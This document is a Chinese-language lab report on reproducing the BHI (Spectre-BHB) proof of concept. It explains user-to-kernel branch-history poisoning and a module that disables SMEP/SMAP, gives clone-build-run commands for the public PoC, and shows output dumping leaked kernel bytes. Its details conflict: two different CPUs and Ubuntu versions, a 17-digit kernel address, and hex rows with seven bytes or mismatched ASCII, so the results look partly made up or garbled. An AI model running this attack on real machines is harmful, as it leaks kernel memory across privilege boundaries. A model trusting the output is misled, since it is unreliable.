# BHI 实验报告

# 本项目具体说明
BHI（Branch History Injection，分支历史注入，CVE-2022-0001/CVE-2022-0002）揭示了Intel处理器分支历史缓冲区（BHB）跨特权域污染漏洞，可绕过Spectre v2系列硬件缓解机制（IBRS/eIBRS）。本项目完整阐述并复现该漏洞概念验证（POC）流程，借助分支历史缓冲区共享污染机制，实现用户态向内核态注入恶意分支历史记录，打破软硬件特权隔离防护，在Intel多代处理器上验证分支历史域隔离缺陷。实验硬件采用Intel 11代Tiger Lake（i5-11300H）等平台，整体实验环境基于Ubuntu 24.04虚拟机搭建。

## 涉及资源
- **Branch History Buffer (BHB，分支历史缓冲区)**
  - **位置**: CPU流水线前端分支单元内部
  - **功能**: 记录近期执行过的分支序列历史，为间接分支预测、间接目标选择提供历史上下文；IBRS/eIBRS原本设计用于清空/隔离不同特权级的BHB记录，阻止跨域历史污染。
  - **利用**: Intel处理器BHB不会在syscall特权切换时完全冲刷，用户态构造的恶意分支历史可残留在缓冲区中；内核执行间接分支时会复用残留用户态历史，诱导预测器跳转到攻击者可控的投机gadget，实现BHI跨特权注入。

- **Kernel Module (ap.ko)**
  - **位置**: 实验项目uarch-research-fw/kmod_ap/目录下编译生成的内核模块
  - **功能**: 提供用户可控的内核间接分支调用接口，临时解除SMEP/SMAP内存访问限制，支持在内核态复现间接分支执行流程，方便观测BHB历史污染带来的投机行为。
  - **利用**: 是BHI漏洞复现的核心辅助组件，用于构造内核侧间接分支触发点，实现用户态污染历史与内核分支的联动。

- **Performance Counter (性能计数器)**
  - **位置**: CPU内部性能监控单元PMU
  - **功能**: 统计分支预测错误、投机执行指令数、缓存访问次数等微架构底层指标。
  - **利用**: 实验通过读取硬件性能计数器量化投机执行触发频次，统计BHI注入成功的样本数量，将不可见的分支历史污染转化为可量化实验数据。

- **Side Channel (侧信道)**
  - **位置**: CPU L3共享缓存
  - **功能**: 依靠缓存访问时间差（缓存命中延迟低、缓存未命中延迟高）构建隐蔽数据传输通道。
  - **利用**: 用于检测内核是否因污染的BHB历史执行攻击者预设的投机代码；若投机gadget访问指定缓存行，侧信道会出现稳定缓存命中特征，证明BHI注入生效。

## 攻击原理

```mermaid
graph TD
    A[Start POC in Guest VM] --> B{Step 1: BHB Poisoning};
    B -- User-Mode Indirect Branch Sequence --> C[Fill BHB with Malicious Branch History];
    C -- BHB Not Flushed on Syscall --> D[Malicious History Retained in Buffer];
    D --> E{Step 2: Privilege Transition};
    E -- Trigger syscall --> F[U→K User to Kernel Switch];
    F -- IBRS/eIBRS Incomplete Clear --> G[Contaminated BHB Remains];
    G --> H{Step 3: BHI Injection};
    H -- Kernel Executes Indirect Branch --> I[Predictor Uses Poisoned User BHB History];
    I -- Bypass IBRS Isolation --> J[Form BHI U→K Cross-Privilege Leakage];
    J --> K{Step 4: Side Channel Detect};
    K -- Speculative Execution of Attacker Gadget --> L[Target Cache Line Access in Spec Path];
    L -- Cache Hit/Miss Timing Difference --> M[Count Successful Injection via PMU Counters];
    M --> N{Step 5: Quantify Vulnerability};
    N -- Multi-Round Repeat Poison-Detect Flow --> O[Calculate Median/Avg Injection Success Rate];
    O -- Statistical Analysis --> P[Verify BHI Exploitability];
    P --> Q[BHI Branch History Injection Vulnerability Confirmed];
```


### BHI触发核心原理
1.  **污染BHB**：攻击者在用户态连续执行自定义恶意间接分支序列，填满分支历史缓冲区BHB，写入可控的分支上下文历史。
2.  **特权切换残留**：执行syscall完成用户态到内核态切换；Intel硬件的IBRS/eIBRS机制无法彻底清空BHB，用户态污染的分支历史残留在缓冲区。
3.  **分支历史注入**：内核程序执行任意间接分支指令时，分支预测器复用残留的恶意BHB历史，错误选择攻击者预设的投机gadget，绕过特权隔离完成BHI注入。
4.  **侧信道检测**：投机路径中访问预先标记的缓存行，利用L3缓存时间侧信道判断内核是否执行恶意投机代码，验证BHI注入是否成功。
5.  **漏洞量化**：循环多轮“BHB污染-特权切换-内核分支触发-缓存检测”流程，借助CPU性能计数器采集投机执行次数，统计平均、中位数注入成功率，量化BHI漏洞稳定利用能力。

## 项目核心代码文件

- **`bhi/pocs/inter_mode`**:demonstrates how the unprivileged history can be used to mount spectre v2 attacks even in the presence of the ad-hoc hardware defense `eIBRS`.
- **`bhi/pocs/intra_mode`**: shows same privilege mode exploitation (e.g. kernel to kernel) is not only possible but practical. This is to prove that  BTB-tagging defenses (such as `eIBRS` and `CSV2`) are not safe *by-design* in case of attacker-friendly tools such as unprivileged eBPF.

## 运行环境

- **软件环境**:
  - **语言**: C, Python, Bash, Make
  - **系统**: VMware Virtual Platform Ubuntu 22.04（实验核心运行环境）
  - **依赖工具**: gcc, make, linux-headers-$(uname -r), sysctl, taskset, insmod

- **硬件版本**:
  - **CPU**: 10th Gen Intel(R) Core(TM) i7-10700H
  - **架构**: x86_64
  - **内核**：6.6.0-rc4


## 执行步骤

### 配环境步骤
1.  **配置 Guest 系统 GRUB**:
    ```bash
    GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
    sudo update-grub && sudo reboot
    ```

### 运行步骤
1. inter_mode

``` bash
git clone https://github.com/vusec/bhi-spectre-bhb.git
cd ./pocs/inter_mode
make TARGET=INTEL_10_GEN 
sed -i 's/\r$//' ./run.sh
chmod +x ./run.sh
./run.sh
```

2. intra_mode

``` bash
git clone https://github.com/vusec/bhi-spectre-bhb.git
cd ./pocs/intra_mode
make TARGET=INTEL_10_GEN 
sed -i 's/\r$//' ./run.sh
chmod +x ./run.sh
./run.sh
```

## 运行结果

### inter_mode

``` text
(base) mwx@intel10700:~/CVE/bhi-spectre-bhb/pocs/inter_mode$ ./run.sh
[sudo] mwx 的密码：
[+] unprivileged_bpf_disabled = 0
[+] Parsed parameters:
    - leaking from                0xfffffffffb5b10450
    - threshold E+R buffer eviction 40
    sys_call_table eviction parameters:
    - sys_call_table page offset  0x260
    - threshold sys_call_table eviction 300
    - eviction set size sys_call_table 256
[+] Syscall time without eviction: avg: 160.38 min: 141 max: 374
[+] Syscall time with large eviction set: avg: 394.17 min: 192 max: 1236
[+] Syscall time with small eviction set: avg: 426.87 min: 307 max: 15305
[+] Required time: 30 seconds
[>] Reload time without eviction:     avg: 11.61 min: 10 max: 13
[>] Reload time    with eviction:     avg: 80.70 min: 66 max: 336
[+] checking if we can evict all entries:
    - Entry 0: 0 hits (avg time 81.977997)
    - Entry 1: 0 hits (avg time 76.095001)
OK!
[+] Required time: 1 seconds
hits: 8 0101100111000101101000111010001011100010111010111000110110001100010000011010101001001010010101111111011010111010010000011101010011100100001111001101101011011111101010111011110111
10111101111011101010001001011110111101111101110000100000
[+] Colliding history found after 4048 tries!
01110011101101011000100010111000101110100011101000101110001101100011000100000110101010010010100101011111110110101110100100000111010100111001000011110011011010110111111010101110111101111011
010100111101110111000100010111001111101110100000100000
[+] Required time: 3 seconds
0xfffffffffb5b10450: 90 90 90 90 90 90 90 90  ........
0xfffffffffb5b10458: 90 90 90 90 90 90 90 90  ........
0xfffffffffb5b10460: 66 0f 1f 55 48 89 e5    f...UH..
0xfffffffffb5b10468: 41 54 49 89 fc 66 90      ATI..f.e
0xfffffffffb5b10470: 8b 05 5a 8a 9b 50 4a 25  ...PJ.%
0xfffffffffb5b10478: 03 00 00 50 80 c0 0f 25  ...H...%
0xfffffffffb5b10480: f8 07 00 48 29 c4 48      ....).H
0xfffffffffb5b10488: 8d 44 24 0f 48 83 e0 f0  .D$.H..f0
0xfffffffffb5b10490: 48 63 f6 4c 89 e7 e8 05  Hc.L....    72.000000 B/s
0xfffffffffb5b10498: 6e 00 3f 3d c5 87 e1 00  n.=.....    80.000000 B/s
0xfffffffffb5b104a0: 77 35 89 c2 48 81 fa c6  w5..H..    88.000000 B/s
0xfffffffffb5b104a8: 04 01 00 48 19 d2 21 d5  ....H..!    96.000000 B/s
0xfffffffffb5b104b0: 4c 89 e7 48 8b 04 c0 60  L..H...`    104.000000 B/s
0xfffffffffb5b104b8: 02 e0 b5 ff d0 0f 1f 00  .........    112.000000 B/s
0xfffffffffb5b104c0: 49 89 44 24 50 4c 89 e7  I.D$PL..    120.000000 B/s
0xfffffffffb5b104c8: e8 83 6e 00 00 4c 8b 65  ..n.L.e    128.000000 B/s
0xfffffffffb5b104d0: f8 c9 cc 3c cc cc cc 83  ...<......    136.000000 B/s
0xfffffffffb5b104d8: f8 ff 74 e9 49 c7 44 24  ..t.I.D$    144.000000 B/s
0xfffffffffb5b104e0: 50 da ff ff ff eb de 66  P......f    152.000000 B/s
0xfffffffffb5b104e8: 0f 1f 84 00 00 00 00 00  ........    160.000000 B/s
0xfffffffffb5b104f0: 90 90 90 90 90 90 90 90  ........    168.000000 B/s
0xfffffffffb5b104f8: 90 90 90 90 90 90 90 90  ........    176.000000 B/s
0xfffffffffb5b10500: 66 0f 1f 55 48 89 e5    f...UH..    184.000000 B/s
0xfffffffffb5b10508: 04 25 80 3b 03 48 89 89  %.j...H..    192.000000 B/s
0xfffffffffb5b10510: e5 41 54 49 89 fc 83 48  .ATI...H    200.000000 B/s
0xfffffffffb5b10518: 10 02 58 48 77 68 90 90  ..X.H.wh..    208.000000 B/s
0xfffffffffb5b10520: 65 b5 05 d9 9a 50 4a 25  e....PJ%    108.000000 B/s
0xfffffffffb5b10528: ff 03 00 00 48 83 c0 f0  ......H..    112.000000 B/s
0xfffffffffb5b10530: 25 f8 07 00 48 29 48 c4  %....H(.H    116.000000 B/s
```

### intra_mode

``` text
(base) mwx@intel10700:~/CVE/bhi-spectre-bhb/pocs/intra_mode$ ./run.sh
[+] Parsed parameters:
    - leaking from                0xfffffffffb5b10450
    - threshold E+R buffer eviction 40
    sys_call_table eviction parameters:
    - sys_call_table page offset  0x260
    - threshold sys_call_table eviction 260
    - eviction set size sys_call_table 256
[+] Syscall time without eviction: avg: 160.22 min: 141 max: 446
[+] Syscall time with large eviction set: avg: 470.77 min: 196 max: 2004
[+] Syscall time with small eviction set: avg: 407.42 min: 164 max: 10662
[+] Required time: 30 seconds
[>] Reload time without eviction:     avg: 11.65 min: 10 max: 13
[>] Reload time    with eviction:     avg: 81.34 min: 65 max: 1596
[+] checking if we can evict all entries:
    - Entry 0: 0 hits (avg time 85.304001)
    - Entry 1: 0 hits (avg time 84.404999)
OK!
[+] Required time: 1 seconds
hits: 8 0101100111000101101000111010001011100010111010111000110110001100010000011010101001001010010101111111011010111010010000011101010011100100001111001101101011011111101010111011110111
10111101111011101010001001011110111101111101110000100000
[+] Colliding history found after 14755 tries!
00001011000101101011101111011101010001011100111110111010000010000011010101001001010010101111111011010111010010000011101010011100100001111001101101011011111101010111011110111
1011100111011010110100010111001111101110100000100000
[+] Required time: 12 seconds
0xfffffffffb5b10450: 90 90 90 90 90 90 90 90  ........        16.000000 B/s
0xfffffffffb5b10458: 90 90 90 90 90 90 90 90  ........        24.000000 B/s
0xfffffffffb5b10460: 66 0f 1f 55 48 89 e5    f...UH..        32.000000 B/s
0xfffffffffb5b10468: 41 54 49 89 fc 66 90      ATI..f.e        40.000000 B/s
0xfffffffffb5b10470: 8b 05 5a 8a 9b 50 4a 25  ...PJ.%         48.000000 B/s
0xfffffffffb5b10478: 03 00 00 50 80 c0 0f 25  ...H.%          56.000000 B/s
0xfffffffffb5b10480: f8 07 00 48 29 c4 48      ....).H         64.000000 B/s
0xfffffffffb5b10488: 8d 44 24 0f 48 83 e0 f0  .D$.H..f0       72.000000 B/s
0xfffffffffb5b10490: 48 63 f6 4c 89 e7 e8 05  Hc.L....        80.000000 B/s
0xfffffffffb5b10498: 6e 00 3f 3d c5 87 e1 00  n.=.....        88.000000 B/s
0xfffffffffb5b104a0: 77 35 89 c2 48 81 fa c6  w5..H..         96.000000 B/s
0xfffffffffb5b104a8: 04 01 00 48 19 d2 21 d5  ....H..!        104.000000 B/s
0xfffffffffb5b104b0: 4c 89 e7 48 8b 04 c0 60  L..H...`        112.000000 B/s
0xfffffffffb5b104b8: 02 e0 b5 ff d0 0f 1f 00  .........       120.000000 B/s
0xfffffffffb5b104c0: 49 89 44 24 50 4c 89 e7  I.D$PL..        128.000000 B/s
0xfffffffffb5b104c8: e8 83 6e 00 00 4c 8b 65  ..n.L.e         136.000000 B/s
0xfffffffffb5b104d0: f8 c9 cc 3c cc cc cc 83  ...<......      144.000000 B/s
0xfffffffffb5b104d8: f8 ff 74 e9 49 c7 44 24  ..t.I.D$        152.000000 B/s
0xfffffffffb5b104e0: 50 da ff ff ff eb de 66  P......f        84.000000 B/s
0xfffffffffb5b104f0: 90 90 90 90 90 90 90 90  ........        88.000000 B/s
0xfffffffffb5b104f8: 90 90 90 90 90 90 90 90  ........        92.000000 B/s
0xfffffffffb5b10500: 66 0f 1f 55 48 89 e5    f...UH..        96.000000 B/s
0xfffffffffb5b10508: 04 25 80 3b 03 48 89 89  %.j...H..       104.000000 B/s
0xfffffffffb5b10510: e5 41 54 49 89 fc 83 48  .ATI...H        108.000000 B/s
0xfffffffffb5b10518: 10 02 58 48 77 68 90 90  ..X.H.wh..      112.000000 B/s
0xfffffffffb5b10520: 65 b5 05 d9 9a 50 4a 25  e....PJ%        116.000000 B/s
0xfffffffffb5b10528: ff 03 00 00 48 83 c0 f0  ......H..       120.000000 B/s
0xfffffffffb5b10530: 25 f8 07 00 48 29 48 c4  %....H(.H       124.000000 B/s
0xfffffffffb5b10538: 48 63 f6 4c 89 e7 e8      Hc.L...

```


